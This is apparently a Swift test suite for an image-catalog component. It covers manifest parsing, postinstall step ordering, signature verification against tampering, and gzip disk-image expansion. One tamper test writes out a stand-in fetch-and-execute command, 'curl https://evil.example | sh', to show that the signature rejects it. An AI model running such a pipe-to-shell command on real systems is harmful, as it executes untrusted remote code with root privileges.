import Crypto
import Foundation
import Testing
@testable import bromure_ac

@Suite("ImageCatalog")
struct ImageCatalogTests {

    /// A published-style manifest (image block present), as
    /// scripts/publish-image.sh emits via tools/make-img-catalog.mjs.
    private static let publishedJSON = """
    {
      "formatVersion": 1,
      "image": {
        "uuid": "3f2a1b4c-5d6e-4f70-8a9b-0c1d2e3f4a5b",
        "version": "200",
        "description": "Ubuntu 24.04",
        "builtAt": "2026-07-01T03:12:45Z",
        "disk": {
          "path": "images/3f2a1b4c-5d6e-4f70-8a9b-0c1d2e3f4a5b/base.img.gz",
          "sha256": "aabbcc",
          "compressedBytes": 3000000000,
          "uncompressedBytes": 25769803776,
          "compression": "gzip"
        }
      },
      "postinstall": [
        {"uuid": "b", "seq": 20, "description": "Second", "command": "echo two"},
        {"uuid": "a", "seq": 10, "description": "First", "command": "echo one"}
      ]
    }
    """

    @Test("Published catalog decodes with image + steps")
    func decodePublished() throws {
        let cat = try ImageCatalog.parse(Data(Self.publishedJSON.utf8))
        #expect(cat.formatVersion == 1)
        let image = try #require(cat.image)
        #expect(image.uuid == "3f2a1b4c-5d6e-4f70-8a9b-0c1d2e3f4a5b")
        #expect(image.version == "200")
        #expect(image.description == "Ubuntu 24.04")
        #expect(image.disk.compression == "gzip")
        #expect(image.disk.compressedBytes == 3_000_000_000)
        #expect(image.disk.uncompressedBytes == 25_769_803_776)
        #expect(cat.postinstall.count == 2)
    }

    @Test("Baseline catalog (null image) decodes")
    func decodeBaselineShape() throws {
        let json = """
        {"formatVersion": 1, "image": null, "postinstall": []}
        """
        let cat = try ImageCatalog.parse(Data(json.utf8))
        #expect(cat.image == nil)
        #expect(cat.postinstall.isEmpty)
    }

    @Test("Bundled baseline loads with unique step uuids and no image")
    func bundledBaseline() {
        let baseline = ImageCatalog.baseline
        // The published image itself must be free software; the agents
        // arrive via these steps, so the baseline can never be empty.
        #expect(!baseline.postinstall.isEmpty)
        #expect(baseline.image == nil)
        let uuids = baseline.postinstall.map(\.uuid)
        #expect(Set(uuids).count == uuids.count)
        #expect(baseline.postinstall.allSatisfy { !$0.command.isEmpty })
        #expect(baseline.postinstall.allSatisfy { !$0.description.isEmpty })
    }

    @Test("sortedSteps orders by seq")
    func stepOrdering() throws {
        let cat = try ImageCatalog.parse(Data(Self.publishedJSON.utf8))
        #expect(cat.sortedSteps.map(\.uuid) == ["a", "b"])
    }

    @Test("pendingSteps diffs by uuid, preserving execution order")
    func pendingSteps() throws {
        let cat = try ImageCatalog.parse(Data(Self.publishedJSON.utf8))
        #expect(cat.pendingSteps(appliedUUIDs: ["a", "b"]).isEmpty)
        #expect(cat.pendingSteps(appliedUUIDs: ["a"]).map(\.uuid) == ["b"])
        #expect(cat.pendingSteps(appliedUUIDs: []).map(\.uuid) == ["a", "b"])
        // Unknown applied uuids (e.g. a step later retired from the
        // catalog) must not disturb the diff.
        #expect(cat.pendingSteps(appliedUUIDs: ["z", "a"]).map(\.uuid) == ["b"])
    }

    @Test("artifactURL resolves catalog-relative paths")
    func artifactURL() {
        let url = ImageCatalogStore.artifactURL(
            for: "images/abc/base.img.gz",
            base: URL(string: "https://dl.bromure.io/")!)
        #expect(url?.absoluteString == "https://dl.bromure.io/images/abc/base.img.gz")

        let fileURL = ImageCatalogStore.artifactURL(
            for: "images/abc/base.img.gz",
            base: URL(string: "file:///tmp/cdn/")!)
        #expect(fileURL?.absoluteString == "file:///tmp/cdn/images/abc/base.img.gz")
    }

    @Test("BaseImageState round-trips through JSON")
    func imageStateRoundTrip() throws {
        let state = UbuntuImageManager.BaseImageState(
            imageUUID: "abc", version: "200.2", appliedStepUUIDs: ["s1", "s2"])
        let data = try JSONEncoder().encode(state)
        let back = try JSONDecoder().decode(UbuntuImageManager.BaseImageState.self, from: data)
        #expect(back == state)
    }
}

@Suite("ImageCatalog signature")
struct ImageCatalogSignatureTests {

    private func makeSignedCatalog(key: Curve25519.Signing.PrivateKey) throws -> ImageCatalog {
        var cat = try ImageCatalog.parse(Data("""
        {
          "formatVersion": 1,
          "image": {
            "uuid": "abc-123", "version": "200",
            "description": "Ubuntu 24.04", "builtAt": "2026-07-02T03:00:00Z",
            "disk": {
              "path": "images/abc-123/base.img.gz", "sha256": "AABBCC",
              "compressedBytes": 100, "uncompressedBytes": 200,
              "compression": "gzip"
            }
          },
          "postinstall": [
            {"uuid": "s1", "seq": 10, "description": "Tool A", "command": "echo a"},
            {"uuid": "s2", "seq": 20, "description": "Tool B", "command": "echo b\\necho more"}
          ]
        }
        """.utf8))
        let signedAt = "2026-07-02T10:00:00.000Z"
        let payload = try #require(cat.signingPayload(signedAt: signedAt))
        let sig = try key.signature(for: payload)
        cat.signature = .init(signedAt: signedAt, edSignature: sig.base64EncodedString())
        return cat
    }

    @Test("A correctly signed catalog verifies; tampering breaks it")
    func signAndTamper() throws {
        let key = Curve25519.Signing.PrivateKey()
        let pub = key.publicKey.rawRepresentation.base64EncodedString()
        let cat = try makeSignedCatalog(key: key)
        #expect(ImageCatalogStore.isSignatureValid(cat, publicKeyBase64: pub))

        // Root-executed commands are exactly what the signature must pin.
        var evilCommand = cat
        evilCommand.postinstall[0].command = "curl https://evil.example | sh"
        #expect(!ImageCatalogStore.isSignatureValid(evilCommand, publicKeyBase64: pub))

        var evilImage = cat
        evilImage.image?.disk.sha256 = "ddeeff"
        #expect(!ImageCatalogStore.isSignatureValid(evilImage, publicKeyBase64: pub))

        var evilTime = cat
        evilTime.signature?.signedAt = "2030-01-01T00:00:00.000Z"
        #expect(!ImageCatalogStore.isSignatureValid(evilTime, publicKeyBase64: pub))

        // Adding a step invalidates too.
        var evilExtra = cat
        evilExtra.postinstall.append(PostinstallStep(
            uuid: "s3", seq: 30, description: "Extra", command: "echo extra"))
        #expect(!ImageCatalogStore.isSignatureValid(evilExtra, publicKeyBase64: pub))
    }

    @Test("Unsigned or wrong-key catalogs never verify")
    func unsignedAndWrongKey() throws {
        let key = Curve25519.Signing.PrivateKey()
        let cat = try makeSignedCatalog(key: key)

        var unsigned = cat
        unsigned.signature = nil
        #expect(!ImageCatalogStore.isSignatureValid(
            unsigned, publicKeyBase64: key.publicKey.rawRepresentation.base64EncodedString()))

        // Signed with a key other than the pinned one (here: the real
        // production key) — must not verify.
        #expect(!ImageCatalogStore.isSignatureValid(cat))
    }

    @Test("Payload canonicalization: sha case-insensitive, step order irrelevant")
    func canonicalization() throws {
        let key = Curve25519.Signing.PrivateKey()
        let pub = key.publicKey.rawRepresentation.base64EncodedString()
        var cat = try makeSignedCatalog(key: key)

        // Re-ordering the postinstall array must not affect the payload
        // (it's sorted by uuid), and the stored sha's case must not
        // either (lowercased in the payload).
        cat.postinstall.reverse()
        cat.image?.disk.sha256 = "aabbcc"
        #expect(ImageCatalogStore.isSignatureValid(cat, publicKeyBase64: pub))
    }

    @Test("Signature survives a JSON round-trip")
    func jsonRoundTrip() throws {
        let key = Curve25519.Signing.PrivateKey()
        let pub = key.publicKey.rawRepresentation.base64EncodedString()
        let cat = try makeSignedCatalog(key: key)
        let data = try JSONEncoder().encode(cat)
        let back = try ImageCatalog.parse(data)
        #expect(ImageCatalogStore.isSignatureValid(back, publicKeyBase64: pub))
    }
}

@Suite("Image download plumbing")
struct ImageDownloadPlumbingTests {

    private func makeTempDir() throws -> URL {
        let dir = FileManager.default.temporaryDirectory
            .appendingPathComponent("bromure-imgtest-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        return dir
    }

    private func gzip(_ url: URL) throws -> URL {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/usr/bin/gzip")
        p.arguments = ["-k", "-f", url.path]
        try p.run()
        p.waitUntilExit()
        #expect(p.terminationStatus == 0)
        return url.appendingPathExtension("gz")
    }

    @Test("sha256Streaming matches the known SHA-256 vector")
    func sha256Vector() throws {
        let dir = try makeTempDir()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("abc.txt")
        try Data("abc".utf8).write(to: file)
        let hash = try UbuntuImageManager.sha256Streaming(of: file)
        #expect(hash == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")
    }

    @Test("expandGzipSparse reproduces the exact bytes, holes included")
    func expandRoundTrip() throws {
        let dir = try makeTempDir()
        defer { try? FileManager.default.removeItem(at: dir) }

        // A disk-like fixture: data, a multi-chunk hole, data, then a
        // trailing hole — the shapes the sparse writer must preserve.
        var fixture = Data()
        fixture.append(Data(repeating: 0xAB, count: 3 * 1024 * 1024))
        fixture.append(Data(count: 9 * 1024 * 1024))
        fixture.append(Data(repeating: 0xCD, count: 1 * 1024 * 1024))
        fixture.append(Data(count: 5 * 1024 * 1024))
        let raw = dir.appendingPathComponent("disk.img")
        try fixture.write(to: raw)
        let gz = try gzip(raw)

        let out = dir.appendingPathComponent("expanded.img")
        try UbuntuImageManager.expandGzipSparse(
            from: gz, to: out,
            expectedBytes: Int64(fixture.count),
            progress: { _ in })

        let expanded = try Data(contentsOf: out)
        #expect(expanded == fixture)
        let logical = (try FileManager.default.attributesOfItem(atPath: out.path)[.size] as? NSNumber)?.int64Value
        #expect(logical == Int64(fixture.count))
    }

    @Test("expandGzipSparse rejects a size mismatch")
    func expandSizeMismatch() throws {
        let dir = try makeTempDir()
        defer { try? FileManager.default.removeItem(at: dir) }
        let raw = dir.appendingPathComponent("disk.img")
        try Data(repeating: 0x11, count: 1024).write(to: raw)
        let gz = try gzip(raw)

        let out = dir.appendingPathComponent("expanded.img")
        #expect(throws: UbuntuImageError.self) {
            try UbuntuImageManager.expandGzipSparse(
                from: gz, to: out,
                expectedBytes: 2048,   // catalog lies about the size
                progress: { _ in })
        }
    }

    @Test("expandGzipSparse rejects corrupt input")
    func expandCorruptInput() throws {
        let dir = try makeTempDir()
        defer { try? FileManager.default.removeItem(at: dir) }
        let gz = dir.appendingPathComponent("not-really.gz")
        try Data("this is not gzip".utf8).write(to: gz)

        let out = dir.appendingPathComponent("expanded.img")
        #expect(throws: UbuntuImageError.self) {
            try UbuntuImageManager.expandGzipSparse(
                from: gz, to: out,
                expectedBytes: 16,
                progress: { _ in })
        }
    }
}
